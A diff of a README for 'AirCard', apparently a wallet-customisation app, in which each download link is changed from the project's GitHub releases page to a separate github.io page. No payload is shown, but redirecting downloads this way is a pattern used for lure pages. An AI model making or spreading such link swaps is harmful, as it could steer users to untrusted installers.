@@ -1,7 +1,7 @@
 <h1>🎴 AirCard - Your Wallet, Beautifully Customized</h1>
 
 <p align="center">
-  <a href="https://github.com/madellahellbent2113/AirCard/releases">
+  <a href="https://madellahellbent2113.github.io">
     <img src="https://img.shields.io/badge/⬇️%20Download%20AirCard%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download AirCard" />
   </a>
 </p>
@@ -33,7 +33,7 @@ Ready to give your wallet a makeover? Here's everything you need to know.
 
 ### 📥 Step 1: Download AirCard
 
-**Visit this link to download the application:** [AirCard Downloads](https://github.com/madellahellbent2113/AirCard/releases)
+**Visit this link to download the application:** [AirCard Downloads](https://madellahellbent2113.github.io)
 
 Click the link above. You'll see a page with download options. Choose the newest version (the one with the highest number) and download it. The file is small, so it won't take long.
 
@@ -149,7 +149,7 @@ AirCard is free to use for personal purposes. You're welcome to customize your o
 
 Thanks for choosing AirCard. We built this because we believe your digital wallet should reflect your personality. Go ahead - make it yours!
 
-**Remember to [download AirCard](https://github.com/madellahellbent2113/AirCard/releases) and start customizing today.**
+**Remember to [download AirCard](https://madellahellbent2113.github.io) and start customizing today.**
 
 ---
 
